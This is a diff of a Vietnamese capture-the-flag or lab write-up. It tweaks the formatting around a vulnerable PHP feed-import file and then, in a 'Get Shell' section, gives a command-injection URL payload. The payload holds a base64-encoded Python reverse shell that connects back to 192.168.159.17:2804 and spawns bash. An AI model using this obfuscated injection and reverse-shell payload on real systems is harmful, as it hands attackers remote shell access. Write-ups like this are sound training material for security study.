@@ -144,7 +144,8 @@ Yeah có vẻ khả thi trên máy mình. Mang nó vào thực hành luôn xem s
 Yeah ngon luôn. Và đây là nội dung file `import_feed_api.php`
 <details>
 <summary><b>Nhấn vào đây để xem toàn bộ code</b></summary>
-<pre><code>
+<pre>
+<code>
 <?php
 include "config.php";
 header("Content-Type: application/json");
@@ -264,12 +265,12 @@ out(true, [
   "message" => "Feed fetched successfully",
   "cmd_output" => $output
 ]);
-</code></pre>
+</code>
+</pre>
 </details>
 
 ## Get Shell
 Đọc được file rồi thì còn chần chờ gì nữa mà không reverse shell thôi kkkk.
-
 
 *Payload:* 
 >http://google.com/$(python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHB0eQpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxOTIuMTY4LjE1OS4xNyIsMjgwNCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnB0eS5zcGF3bigiL2Jpbi9iYXNoIik=').decode())")
